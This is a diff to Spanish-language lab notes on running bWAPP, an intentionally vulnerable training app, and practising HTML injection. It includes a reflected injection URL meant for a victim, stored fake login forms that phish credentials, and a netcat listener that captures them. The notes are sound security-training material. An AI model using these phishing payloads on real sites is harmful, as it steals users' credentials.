@@ -7,11 +7,8 @@ para arrancar bWAPP
 abrir una consola / terminal de comandos.
 copiar y pegar:
 docker run -d -p 80:80 hackersploit/bwapp-docker
-docker run --rm -it -p 80:80 hackersploit/bwapp-docker
-
-para visualizar bWAPP
-arrancar un navegador y teclear
-localhost:80
+instalar la aplicación bWAPP
+http://127.0.0.1/install.php⁠
 
 # bWAPP login
 http://localhost/bWAPP/
@@ -20,4 +17,28 @@ Login credentials:
         Username: bee
         Password: bug
 
+
+------  HTML Injection - Reflected (GET)
+- uso normal. introducir credenciales: alice / loveZombies
+- comprobacion de que no se validan los datos de entrada:  
+alice / <b>loveZombies</b>
+<h1>Hola<h1> / <h2>Mundo<h2>
+ataque --> mandar a la victima la URL 'tuneada'
+[http://192.168.1.106/bWAPP/]htmli_get.php?firstname=<h1>Hola Hackers</h1>&lastname=<img src="https://img.gallerix.com/product/4592_36741.jpg">&form=submit
+
+
+------  HHTML Injection - Stored (Blog)
+- uso normal: introducir uno/varios comentario en el blog
+- ataque --> inyectar un comentario que contiene un formulario de login patra capturar las credenciales
+<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" action="http://localhost:8080/login.htm"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
+- abrir un listener en una consola en una IP:puerto (aquí localhost:8080) 
+sudo nc -vlp 8080
+
+
+https://www.hackplayers.com/2017/06/diseccionando-bwapp-html-injection.html
+captira de página de login e inyección en los campos del forulario
+user:
+</div><div id="mai"><h1>Login</h1><p>Enter your credentials <i>(bee/bug)</i>.</p><form action="/bWAPP/login.php" method="POST"><p><label for="login">Login:</label><br /><input type="text" id="login" name="login" size="20" autocomplete="off"></p> <p><label for="password">Password:</label><br /><input type="password" id="password" name="password" size="20" autocomplete="off"></p><p><label for="security_level">Set the security level:</label><br /><select name="security_level"><option value="0">low</option><option value="1">medium</option><option value="2">high</option></select></p><button type="submit" name="form" value="submit">Login</button></form><br /></div>
+password:
+ <style type="text/css"> #main {display: none;} #mai {padding-left: 100px;padding-top: 25px;    position: relative;width: 760px;margin-bottom: 50px;}#mai p {padding-bottom: 12px;}#mai a { text-decoration:none; font-weight:bold;color: #666;}#mai h1 {font-family: "Architects Daughter", "Helvetica Neue", Helvetica, Arial, serif; font-size: 40px;letter-spacing: -1px;color: #474747;padding-bottom: 12px;} #mai h1:before {content: "/";color: #ff4500;padding-right: 15px;}#mai h1:after {content: "/";color: #ff4500;padding-left: 15px;}#mai h2 {font-family: "Architects Daughter", "Helvetica Neue", Helvetica, Arial, serif; font-size: 30px;letter-spacing: -1px;color: #474747;padding-bottom: 18px;} #mai h2:before {content: "//";color: #ff4500;padding-right: 15px;}#mai h2:after {content: "//";color: #ff4500;padding-left: 15px;}</style>
 
